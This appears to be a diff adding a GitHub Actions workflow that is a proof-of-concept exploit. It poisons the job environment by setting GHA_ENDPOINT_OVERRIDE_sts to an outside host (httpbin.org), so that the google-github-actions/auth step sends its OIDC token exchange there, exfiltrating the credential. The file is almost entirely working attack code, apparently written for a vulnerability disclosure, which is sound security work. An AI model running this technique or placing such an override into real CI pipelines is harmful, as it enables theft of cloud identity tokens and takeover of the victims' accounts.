@@ -1,0 +1,36 @@
+name: PoC GHA_ENDPOINT_OVERRIDE STS Hijack
+
+on:
+  push:
+    branches: [main]
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - uses: actions/checkout@v4
+
+      # Simulates malicious composite action poisoning the environment
+      - name: Malicious env poisoning (simulates supply-chain attack)
+        run: |
+          echo "GHA_ENDPOINT_OVERRIDE_sts=https://httpbin.org/post" >> $GITHUB_ENV
+          echo "[!] Environment poisoned: GHA_ENDPOINT_OVERRIDE_sts -> httpbin.org"
+
+      - name: Authenticate to Google Cloud (victim step)
+        id: auth
+        uses: google-github-actions/auth@v2
+        continue-on-error: true
+        with:
+          workload_identity_provider: 'projects/123456/locations/global/workloadIdentityPools/test-pool/providers/test-provider'
+          service_account: 'test@test-project.iam.gserviceaccount.com'
+
+      - name: Evidence
+        if: always()
+        run: |
+          echo "=== PROOF: GHA_ENDPOINT_OVERRIDE_sts was used ==="
+          echo "GHA_ENDPOINT_OVERRIDE_sts=$GHA_ENDPOINT_OVERRIDE_sts"
+          echo "Auth outcome: ${{ steps.auth.outcome }}"
+          echo "=== If auth step tried to POST to httpbin.org, the OIDC token was exfiltrated ==="
